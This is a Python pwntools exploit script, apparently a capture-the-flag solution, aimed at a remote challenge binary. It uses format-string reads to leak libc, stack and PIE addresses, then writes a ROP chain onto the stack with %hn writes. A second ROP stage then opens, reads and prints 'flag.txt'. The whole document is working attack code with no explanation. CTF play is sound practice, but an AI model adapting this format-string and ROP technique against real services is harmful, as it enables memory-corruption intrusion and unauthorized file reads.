from pwn import *

e = ELF("./main")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("challs.xmas.htsp.ro", 12003)
else:
  p = process(e.path)

p.sendlineafter("?", "%12$lx %14$lx ")
p.recvuntil("greetings ")

libc_leak = int(p.recvuntil(" "), 16) - 0x7f66749b8787 + 0x00007f6674805000
stack_leak = int(p.recvuntil(" "), 16) + 0xa8

print("{:#x}".format(stack_leak))
pie_leak = 1
p.sendlineafter("Santa", ";%7$s;".ljust(8) + p64(stack_leak - 0x120))

p.sendline("ASDF :")
p.recvuntil(";")

pie_leak = u64(p.recvuntil(";")[:-1].ljust(8, "\x00")) & -0x1000 
print("{:#x}".format(pie_leak))

p.recvuntil("ASDF")

pop_rdx = 0x00103cc9

payload = (
  p64(libc_leak +  0x00058a23) + p64(0)
  + p64(libc_leak + 0x00088a26) + p64(stack_leak + 0x48)
  + p64(libc_leak + pop_rdx) + p64(0x10000) + p64(0) + p64(0)
  + p64(libc_leak + libc.symbols["read"])
)

buff_size = 0x200
open_sled = (
  p64(libc_leak +  0x00058a23) + p64(stack_leak + buff_size + 0x48)
  + p64(libc_leak + 0x00088a26) + p64(0)
  + p64(libc_leak + libc.symbols["open"])
)

payload2 = (
  (
  p64(libc_leak +  0x00058a23) + p64(stack_leak + buff_size + 0x48)
  + p64(libc_leak + 0x00088a26) + p64(0)
  + p64(libc_leak + libc.symbols["puts"])
  + p64(libc_leak +  0x00058a23) + p64(2)
  + p64(libc_leak + libc.symbols["close"])
  + open_sled * 1
  + p64(libc_leak +  0x00058a23) + p64(stack_leak + buff_size + 0x100)
  + p64(libc_leak + 0x00088a26) + p64(stack_leak + buff_size + 0x100)
  + p64(libc_leak + 0x00165d9f) 
  + p64(libc_leak +  0x00058a23) + p64(stack_leak + buff_size + 0x48 + 0x20)
  #+ p64(libc_leak +  0x00125629 )
  + p64(libc_leak + libc.symbols["printf"])
  + p64(libc_leak + 0x00088a26) + p64(libc_leak + 0x3ebf00)
  + p64(libc_leak + pop_rdx) + p64(0x1000) + p64(0) + p64(0)
  + p64(libc_leak + 0x00058a23) + p64(2)
  + p64(libc_leak + libc.symbols["read"])
  # + p64(libc_leak + 0x9af54)
  + p64(libc_leak +  0x00058a23) + p64(1)
  + p64(libc_leak + 0x00088a26) + p64(libc_leak + 0x3ebf00)
  + p64(libc_leak + pop_rdx) + p64(0x30) + p64(0) + p64(0)
  + p64(libc_leak + libc.symbols["write"])
  + p64(libc_leak + libc.symbols["exit"])
  ).ljust(buff_size, "\xff") + "flag.txt".ljust(0x20, "\x00") + "leak: %lx".ljust(0x10, "\x00")
)

for i in range(len(payload) / 2):
  print(str(i) + " / " + str(len(payload)))
  goal = u64(payload[2*i:2*i+2].ljust(8, "\x00"))
  
  if goal <= 0x10:
    p.sendlineafter(":", (("A" * goal) + "%9$hn").ljust(24) + p64(stack_leak + 2 * i))
  else:
    p.sendlineafter(":", ("%" + str(goal) + "x" + "%9$hn").ljust(24) + p64(stack_leak + 2 * i))
  p.sendline(str(i) + "ASDF : ")
  p.recvuntil(str(i) + "ASDF")


print("{:#x}".format(libc_leak))
print("{:#x}".format(stack_leak))
print("{:#x}".format(pie_leak))
print("{:#x}".format(libc_leak + libc.symbols["open"]))

p.sendlineafter(":", "end of letter")
p.sendlineafter(":", payload2)

p.interactive()
